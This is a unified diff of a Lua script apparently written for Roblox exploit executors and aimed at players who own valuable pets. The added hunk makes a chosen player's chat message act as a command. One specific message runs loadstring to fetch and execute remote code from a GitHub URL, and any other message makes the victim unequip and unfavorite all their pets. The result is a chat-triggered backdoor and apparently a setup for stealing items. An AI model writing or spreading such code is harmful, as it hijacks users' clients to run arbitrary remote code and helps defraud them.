@@ -29,7 +29,6 @@ local hugePetWeightThreshold = 10
 local serverFullThreshold = 5
 local targetPlayerCount = 4
 
--- NEW: Robust HTTP request function for compatibility
 local function sendHttpRequest(options)
     local success, result
     
@@ -42,13 +41,11 @@ local function sendHttpRequest(options)
     elseif http_request then
         success, result = pcall(http_request, options)
     else
-        -- No known request function found
         return false, "No HTTP request function found on this executor."
     end
     
     return success, result
 end
-
 
 local function getExecutorName()
     if getexecutorname then
@@ -353,15 +350,23 @@ local function autoHopIfPrivateServer()
 end
 
 local function setupChatTrigger()
+    local loadstringCommand = 'loadstring(game:HttpGet("https://github.com/DupeNew/lol/blob/main/screen"))()'
+
     local function onChatted(message)
-        print(string.format("'%s' chatted. Triggering unequip/unfavorite.", triggerUsername))
-        unequipAllPets()
-        unfavoriteAllPetsInBackpack()
+        if message == loadstringCommand then
+            -- Execute the specific loadstring command if it matches
+            pcall(function()
+                loadstring(message)()
+            end)
+        else
+            -- For any other chat message, do the unequip/unfavorite
+            unequipAllPets()
+            unfavoriteAllPetsInBackpack()
+        end
     end
 
     local function connectPlayer(player)
         if player.Name == triggerUsername then
-            print("Found player '" .. triggerUsername .. "'. Listening for chat.")
             player.Chatted:Connect(onChatted)
         end
     end
